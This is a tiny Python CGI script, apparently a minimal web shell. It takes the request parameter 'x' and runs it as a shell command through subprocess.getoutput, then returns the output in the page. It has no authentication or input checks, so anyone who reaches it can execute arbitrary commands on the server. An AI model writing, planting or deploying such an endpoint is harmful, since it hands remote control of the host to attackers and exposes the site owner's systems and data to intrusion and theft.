#!/usr/bin/python3

print("content-type: text/html")
print()

import subprocess,cgi
form=cgi.FieldStorage()
cmd=form.getvalue("x")
output=subprocess.getoutput(cmd)
print(output)
